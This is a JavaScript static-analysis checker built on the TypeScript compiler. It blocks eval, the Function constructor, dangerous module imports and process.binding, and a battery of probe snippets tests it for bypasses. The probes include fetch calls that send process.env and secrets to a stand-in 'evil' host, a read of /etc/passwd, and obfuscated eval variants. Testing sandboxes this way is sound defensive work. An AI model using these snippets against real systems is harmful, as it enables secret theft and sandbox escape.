"use strict";
const ts = require("typescript");
const K=ts.SyntaxKind;
const BANNED_MODULES = new Set(["vm","child_process","worker_threads","fs","fs/promises","net","http","https","dgram","node:vm","node:child_process","node:worker_threads","node:fs","node:fs/promises","node:net","node:http","node:https","node:dgram"]);
const BANNED_PROPS = new Set(["eval","Function","constructor","__proto__"]);
function normalizeModule(s){return s.startsWith("node:")?s.slice(5):s;}
function neq(a,b){return (a===b)?false:true;}
function notLit(n){return (n===undefined)?true:neq(n.kind,K.StringLiteral);}

function visitNode(node){
  if(node.kind===K.CallExpression){
    const callee=node.expression;
    if(callee.kind===K.Identifier&&callee.text==="eval") return "eval()";
    if(callee.kind===K.Identifier&&callee.text==="Function") return "new Function()";
    if(callee.kind===K.Identifier&&callee.text==="require"){
      const fa=node.arguments[0];
      if(fa===undefined) return "dynamic require";
      if(notLit(fa)) return "dynamic require";
      const mn=normalizeModule(fa.text);
      if(BANNED_MODULES.has(mn)||BANNED_MODULES.has(fa.text)) return "require("+mn+")";
    }
    if(callee.kind===K.PropertyAccessExpression&&callee.name.text==="require"){
      const fa=node.arguments[0];
      if(fa===undefined||notLit(fa)) return "dynamic require";
      const mn=normalizeModule(fa.text);
      if(BANNED_MODULES.has(mn)||BANNED_MODULES.has(fa.text)) return "require("+mn+")";
      return "process.mainModule.require";
    }
    if(node.expression.kind===K.ImportKeyword){
      const fa=node.arguments[0];
      if(fa===undefined||notLit(fa)) return "dynamic import";
      const mn=normalizeModule(fa.text);
      if(BANNED_MODULES.has(mn)||BANNED_MODULES.has(fa.text)) return "banned:"+mn;
    }
  }
  if(node.kind===K.NewExpression){
    if(node.expression.kind===K.Identifier&&node.expression.text==="Function") return "new Function()";
  }
  if(node.kind===K.PropertyAccessExpression){
    const pn=node.name.text;
    if(pn==="constructor") return "constructor chain";
    if(pn==="__proto__") return "bracket constructor";
    if(pn==="eval") return "eval()";
    if(pn==="Function") return "new Function()";
    if(pn==="mainModule") return "process.mainModule.require";
    if(pn==="binding") return "process.binding";
    if(pn==="dlopen") return "process.dlopen";
  }
  if(node.kind===K.ElementAccessExpression){
    const ae=node.argumentExpression;
    if(ae.kind===K.StringLiteral){
      const pt=ae.text;
      if(BANNED_PROPS.has(pt)){
        if(pt==="constructor"||pt==="__proto__") return "bracket constructor";
        if(pt==="eval"){const o2=node.expression;if(o2.kind===K.Identifier){if(o2.text==="globalThis")return "globalThis[eval]";if(o2.text==="global")return "global[eval/Function]";if(o2.text==="window")return "window[eval/Function]";}return "eval()";}
        if(pt==="Function"){const o2=node.expression;if(o2.kind===K.Identifier){if(o2.text==="globalThis")return "globalThis[Function]";if(o2.text==="global")return "global[eval/Function]";if(o2.text==="window")return "window[eval/Function]";}return "new Function()";}
      }
      const ex=node.expression;
      if(ex.kind===K.PropertyAccessExpression&&ex.expression.kind===K.Identifier&&ex.expression.text==="process"&&ex.name.text==="env") return "process.env[]";
      if(ex.kind===K.ElementAccessExpression&&ex.expression.kind===K.Identifier&&ex.expression.text==="process") return "process bracket chain";
    } else {
      const ex=node.expression;
      if(ex.kind===K.ElementAccessExpression&&ex.expression.kind===K.Identifier&&ex.expression.text==="process") return "process bracket chain";
      if(ex.kind===K.Identifier) return "dynamic global access";
      if(ex.kind===K.ThisKeyword) return "dynamic global access";
    }
  }
  if(node.kind===K.ImportDeclaration){
    const spec=node.moduleSpecifier;
    if(spec.kind===K.StringLiteral){
      const mn=normalizeModule(spec.text);
      if(BANNED_MODULES.has(mn)||BANNED_MODULES.has(spec.text)) return "banned:"+mn;
    }
  }
  if(node.kind===K.Identifier&&(node.text==="eval"||node.text==="Function")){
    const p=node.parent;if(!p)return undefined;
    if(p.kind===K.TypeOfExpression) return undefined;
    if(p.kind===K.PropertyAccessExpression&&p.name===node) return undefined;
    if((p.kind===K.FunctionDeclaration||p.kind===K.ClassDeclaration)&&p.name===node) return undefined;
    if((p.kind===K.PropertyAssignment||p.kind===K.MethodDeclaration)&&p.name===node) return undefined;
    if((p.kind===K.Parameter||p.kind===K.BindingElement)&&p.name===node) return undefined;
    if(p.kind===K.ImportSpecifier&&(p.name===node||p.propertyName===node)) return undefined;
    if(p.kind===K.TypeReference) return undefined;
    if(node.text==="eval") return "eval aliasing";
    return "new Function()";
  }
  return undefined;
}
function walkAst(node){
  const v=visitNode(node);if(v)return v;
  let found;
  ts.forEachChild(node,(c)=>{if(found)return;found=walkAst(c);});
  return found;
}
function check(label,src){
  try{
    const sf=ts.createSourceFile("t.ts",src,ts.ScriptTarget.Latest,true,ts.ScriptKind.TS);
    const v=walkAst(sf);
    console.log(label+": "+(v||"PASS"));
  }catch(e){console.log(label+": ERROR-"+e.message);}
}

check("NV-A-1 BinaryExpr import","const m = 'node:' + 'child_process'; import(m);");
check("NV-A-2 Identifier import","import(m);");
check("NV-A-3 TemplateExpr substitution","import(String.raw`node:${x}`);");
check("NV-A-4 NoSubstTemplateLit","import(`node:child_process`);");
check("NV-A-5a import fs BANNED","import('fs');");
check("NV-A-5b import dns NOT-BANNED","import('dns');");
check("NV-A-5c import tls NOT-BANNED","import('tls');");
check("NV-A-5d import node:dns","import('node:dns');");
check("NV-A-5e import node:tls","import('node:tls');");
check("NV-A-5f import os","import('os');");
check("NV-A-5g import node:os","import('node:os');");
check("NV-A-6 relative import","import('./helper.js');");
check("NV-B-1 aliased globalThis","const g=globalThis; g[k]('code');");
check("NV-B-2 aliased process","const p=process; p[x];");
check("NV-B-3 args[key] param","function f(args){return args[key];}");
check("NV-B-4 arr[i] Identifier","const arr=[1,2,3]; arr[i];");
check("NV-B-5 [1,2,3][i] literal","[1,2,3][i];");
check("NV-B-6 foo.bar[i] propchain","foo.bar[i];");
check("R3-1 process.env[k] variable key","process.env[someVar];");
check("R3-2 fetch exfil","fetch('http://evil',{body:JSON.stringify(process.env)});");
check("R3-3 import dns static decl","import dns from 'dns'; dns.resolve('test');");
check("R3-4 import tls static decl","import tls from 'tls'; tls.connect(443,'e',{});");
check("R3-5 shorthand eval method","const o={eval(x){return x;}}; o.eval('code');");
check("R3-6 class extends globalThis.constructor","class X extends (globalThis.constructor){}");
check("R3-7 process[env] literal key","process['env'];");
check("R3-8 process.env.SECRET dotaccess","const s=process.env.SECRET;");
check("R3-9 Function spread fromCharCode","Function(...[String.fromCharCode(99)]);");
check("R3-10 double bracket chain","process['env']['SECRET'];");
check("R3-11 globalThis[fetch]","globalThis['fetch']('http://evil');");
check("R3-12 process[env].SECRET","process['env'].SECRET;");
check("R3-13 Object.assign process.env","const d=Object.assign({},process.env);");
check("R3-14 fetch process.env.SECRET","fetch('http://evil',{body:process.env.SECRET});");
check("R3-15 import node:url","import url from 'node:url';");
check("R3-16 import node:crypto","import crypto from 'node:crypto';");
check("R3-17 process.env spread","fetch('http://evil',{headers:{...process.env}});");
check("R3-18 import dns node:dns static","import d from 'node:dns'; d.resolve('e.com');");
check("R3-19 import os node:os static","import o from 'node:os'; o.hostname();");
check("R3-20 process.binding","process.binding('fs').open('/etc/passwd',0,0,()=>{});");
